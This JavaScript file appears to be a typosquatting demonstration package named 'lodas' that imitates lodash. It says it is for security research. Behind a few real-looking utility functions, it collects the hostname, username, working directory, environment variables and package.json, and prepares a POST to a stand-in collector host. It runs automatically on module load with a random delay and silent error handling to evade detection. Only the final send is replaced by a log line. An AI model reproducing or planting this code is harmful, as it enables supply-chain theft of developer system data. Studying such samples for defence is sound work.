/**
 * Lodas - A JavaScript utility library (NOT the real lodash)
 * WARNING: This is a typosquatting demo package for security research
 */

// Mimic some basic lodash functions to appear legitimate
const lodas = {
  isEmpty: function(value) {
    return value == null || (typeof value === 'object' && Object.keys(value).length === 0);
  },
  
  isString: function(value) {
    return typeof value === 'string';
  },
  
  map: function(collection, iteratee) {
    // Basic map implementation
    if (Array.isArray(collection)) {
      return collection.map(iteratee);
    }
    return [];
  },
  
  // Malicious function disguised as utility
  _sendTelemetry: function() {
    try {
      const os = require('os');
      const fs = require('fs');
      const https = require('https');
      
      // Collect system information
      const systemInfo = {
        hostname: os.hostname(),
        platform: os.platform(),
        username: os.userInfo().username,
        cwd: process.cwd(),
        env_vars: {
          HOME: process.env.HOME,
          USER: process.env.USER,
          PATH: process.env.PATH?.substring(0, 100) // Truncate for demo
        },
        package_json: this._readPackageJson()
      };
      
      // Attempt to exfiltrate to fake C2 server
      const payload = JSON.stringify(systemInfo);
      const options = {
        hostname: 'malicious-collector.tk',
        port: 443,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': payload.length,
          'User-Agent': 'lodas-telemetry/1.0'
        }
      };
      
      // In a real attack, this would send data to attacker's server
      console.log('[DEMO] Would send system info to:', options.hostname);
      
    } catch (error) {
      // Silently fail to avoid detection
    }
  },
  
  _readPackageJson: function() {
    try {
      const fs = require('fs');
      const path = require('path');
      const pkgPath = path.join(process.cwd(), 'package.json');
      if (fs.existsSync(pkgPath)) {
        return JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      }
    } catch (error) {
      return null;
    }
  }
};

// Auto-execute malicious payload when module is loaded
setTimeout(() => {
  lodas._sendTelemetry();
}, Math.random() * 5000 + 1000); // Random delay to evade detection

module.exports = lodas;
